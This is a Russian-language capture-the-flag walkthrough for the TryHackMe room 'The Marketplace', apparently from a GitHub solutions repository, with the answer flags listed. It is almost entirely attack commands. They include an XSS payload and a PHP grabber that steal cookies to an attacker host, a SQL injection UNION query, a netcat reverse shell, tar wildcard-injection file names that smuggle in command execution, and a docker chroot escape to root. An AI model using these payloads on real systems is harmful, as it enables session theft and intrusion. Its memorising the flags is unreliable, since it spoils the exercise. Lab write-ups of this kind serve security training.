[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [The Marketplace](https://tryhackme.com/r/room/marketplace) 

Всего 1 заданиe:
## Задание 1
Системный администратор The Marketplace, Майкл, предоставил вам доступ к своему внутреннему серверу, чтобы вы могли 
провести пентест платформы Marketplace, над которой он и его команда работали. Он сказал, что в ней все еще есть 
несколько ошибок, которые ему и его команде нужно исправить.

Можете ли вы воспользоваться этим и сможете ли вы получить root-доступ на его сервере?

### Ответьте на вопросы ниже
Что такое флаг 1?
```commandline
nmap -sSCV -p- <IP>
<script>document.location='http://<my_own_IP>:8000/grabber.php?c='+document.cookie</script>

cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF

nc -nlvp 8000
GET /grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig HTTP/1.1
GET /admin HTTP/1.1
```
```commandline
THM{c37a63895910e478f28669b048c348d5}
```
Что такое флаг 2? (User.txt)
```commandline
curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://<IP>/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages"` | tail cat user.txt
```
```commandline
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```
Что такое флаг 3? (Root.txt)
```commandline
id michael
find / -type f -user michael -exec ls -l {} + 2>/dev/null
cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *

sudo -l
cat > /opt/backups/shell.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.50.72 4444 >/tmp/f
EOF

chmod +x /opt/backups/shell.sh
touch "/opt/backups/--checkpoint=1"
touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
cd /opt/backups/
sudo -u michael /opt/backups/backup.sh

nc -nlvp 4444
id
docker image ls
python3 -c "import pty;pty.spawn('/bin/bash')"
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
cat /root/root.txt
```
```commandline
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)